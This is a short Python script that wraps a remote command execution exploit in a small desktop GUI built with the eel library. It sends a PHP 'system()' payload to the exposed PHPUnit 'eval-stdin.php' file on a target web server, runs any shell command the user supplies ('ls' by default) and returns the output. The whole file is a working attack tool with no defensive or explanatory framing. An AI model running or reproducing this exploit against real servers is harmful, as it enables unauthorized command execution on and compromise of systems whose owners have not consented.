#!/usr/bin/python
import requests
import sys
import eel


eel.init('web')

@eel.expose
def run(url,command = "ls"):
    url = url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    prefix = "<?php system('"
    postfix = "');die(); ?>"
    data = prefix + command + postfix
    response = requests.get(url, data=str(data))
    return response.content


eel.start('index.html', size=(1000, 600))
